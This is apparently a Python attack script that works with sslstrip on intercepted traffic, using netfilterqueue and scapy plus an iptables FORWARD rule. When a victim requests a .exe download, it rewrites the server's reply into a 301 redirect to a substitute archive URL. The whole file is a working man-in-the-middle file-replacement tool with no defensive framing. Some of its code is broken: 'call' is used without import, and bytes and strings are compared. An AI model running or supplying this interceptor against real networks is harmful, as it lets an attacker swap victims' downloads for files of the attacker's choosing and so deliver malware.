import netfilterqueue as nfq
from termcolor import colored
from os import getuid
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].dport == 10000:  # sslstrip
            # the exe file is no the replacing file
            if b".exe" in scapy_packet[scapy.Raw].load and "https://d.winrar.es" not in scapy_packet[scapy.Raw].load:
                print(f"{colored('[!]', 'green')} Exe found")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:  # sslstrip
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print(f"{colored('[!]', 'green')} Response found")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: https://d.winrar.es/d/97z1598410972/U2DnkuU9W-DCiIF55Yr3JQ/rarlinux-x64-5.9.1.tar.gz\r\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].len

                packet.set_payload(bytes(scapy_packet))

    packet.accept()


def check_sudo():
    if getuid() != 0:
        print(
            f"{colored('[-]', 'red')} You must be super user to run this script")
        exit(1)


check_sudo()
call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
queue = nfq.NetfilterQueue()

queue.bind(0, process_packet)
try:
    print(f"{colored('[!]', 'cyan')} Running")
    queue.run()
except KeyboardInterrupt:
    print(f"\n{colored('[!]', 'red')} Exit")
    call('iptables -D FORWARD -j NFQUEUE --queue-num 0', shell=True)
